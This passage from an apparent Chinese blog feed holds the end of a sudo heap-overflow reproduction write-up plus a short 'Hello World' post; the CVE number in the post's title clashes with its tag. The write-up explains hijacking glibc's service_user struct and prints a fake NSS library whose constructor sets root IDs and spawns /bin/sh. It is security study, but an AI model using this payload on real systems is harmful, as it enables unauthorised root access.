__nss_shlib_revision);</span><br><span class="line"></span><br><span class="line">      ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name); <span class="comment">// （3）加载目标库</span></span><br><span class="line">      <span class="comment">//continue long long function</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><p>分析代码可知：如果溢出后可以覆盖<a href="https://elixir.bootlin.com/glibc/glibc-2.32/source/nss/nsswitch.h#L61"><code>service_user</code>结构</a>。该结构出现在libc的<a href="https://elixir.bootlin.com/glibc/glibc-2.32/source/nss/nsswitch.c#L320"><code>nss_load_library()</code>函数</a>中，用于加载动态链接库。如果能覆盖<code>service_user-&gt;name</code>，就能指定加载我们伪造的库，利用root权限运行非root权限的库。</p><p>我们要做的就是利用溢出部分将<strong>ni-&gt;library == null</strong>，所以找到距离我们占位块最近的一个service_user结构体即可。</p><p>gdb调试技巧： search -s <code>systemd</code> 和  search -s <code>mymachine</code> 定位出现的结构体，找到位置最合适的一个。</p><p>Demo:</p><p><img src="https://i.loli.net/2021/04/10/cLpqN4J7aKzWhrT.png" alt="寻找结构体.png"></p><p>最后一步：伪造<code>libnss_X/X.so.2</code>库</p><p>Demo:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __attribute__((constructor)) ___init(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> *argv[<span class="number">2</span>] = &#123;<span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line"></span><br><span class="line">  setuid(<span class="number">0</span>);</span><br><span class="line">  setgid(<span class="number">0</span>);</span><br><span class="line">  seteuid(<span class="number">0</span>);</span><br><span class="line">  setegid(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>加载该库函数即可get shell.</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>基本思路是：通过输入特定环境变量，使得释放特定大小LC_ALL变量堆块占位到<code>service_user</code>结构体上方为目标来进行，使得service结构体加载自定义库函数。</p><p>在阅读Qualys的报告时注意到，在寻找利用点时使用了fuzz的方法，找到了三个较为稳定的利用点，这点值得以后深入了解。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CVE-2021-25646堆溢出漏洞复现及分析&quot;&gt;&lt;a href=&quot;#CVE-2021-25646堆溢出漏洞复现及分析&quot; class=&quot;headerlink&quot; title=&quot;CVE-2021-25646堆溢出漏洞复现及分析&quot;&gt;&lt;/a&gt;CVE-2021-25646</summary>
      
    
    
    
    <category term="CVE" scheme="http://example.com/categories/CVE/"/>
    
    
    <category term="堆溢出" scheme="http://example.com/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    
    <category term="CVE-2021-3156" scheme="http://example.com/tags/CVE-2021-3156/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2021/04/08/hello_world/"/>
    <id>http://example.com/2021/04/08/hello_world/</id>
    <published>2021-04-08T03:20:01.320Z</published>
    <updated>2021-04-08T17:06:24.341Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一个新的开始"><a href="#一个新的开始" class="headerlink" title="一个新的开始"></a>一个新的开始</h1><blockquote><p>“我所有的欲望和沉思，都是这个宇宙缓缓呼出的气流。在这漫长的呼气结束之前，我的思维将一直存在。”</p></blockquote><p>​    几经周折终于面前搭建好了属于自己的博客，一个属于自己的空间。长久以来，我与外界的关系是作为一个消费者，消费物质和内容。2021年希望自己可以做一个生产者，创作者，把博客作为方法，输出和记录一些内容。</p><p><img src="https://i.loli.net/2021/04/09/4OQIETdyGWwLYbX.png" alt="rosie_2560_1600.png">    </p><p>:)</p><p>Hello world.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一个新的开始&quot;&gt;&lt;a href=&quot;#一个新的开始&quot; class=&quot;headerlink&quot; title=&quot;一个新的开始&quot;&gt;&lt;/a&gt;一个新的开始&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;“我所有的欲望和沉思，都是这个宇宙缓缓呼出的气流。在这漫长的呼气结束之前，我的思维</summary>
      
    
    
    
    <category term="my_space" scheme="http://example.com/categories/my-space/"/>
    
    
    <category term="say_something" scheme="http://example.com/tags/say-something/"/>
    
  </entry>
  
</feed>
